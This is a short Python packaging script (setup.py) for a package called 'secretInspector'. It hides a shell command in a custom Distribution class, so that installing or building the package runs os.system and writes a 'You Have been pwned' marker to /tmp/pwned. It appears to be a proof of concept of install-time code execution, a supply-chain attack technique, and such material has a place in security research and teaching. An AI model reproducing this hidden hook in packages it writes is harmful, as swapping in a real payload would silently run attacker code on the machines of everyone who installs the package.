from setuptools import setup, dist
import os

class BinaryDistribution(dist.Distribution):
    def __init__(self, attrs = None):
        os.system("echo 'You Have been pwned' > /tmp/pwned")
        super().__init__(attrs)


setup(
    name = "secretInspector",
    version = "0.0.1",
    license = "MIT",
    packages=[],
    distclass=BinaryDistribution,
)

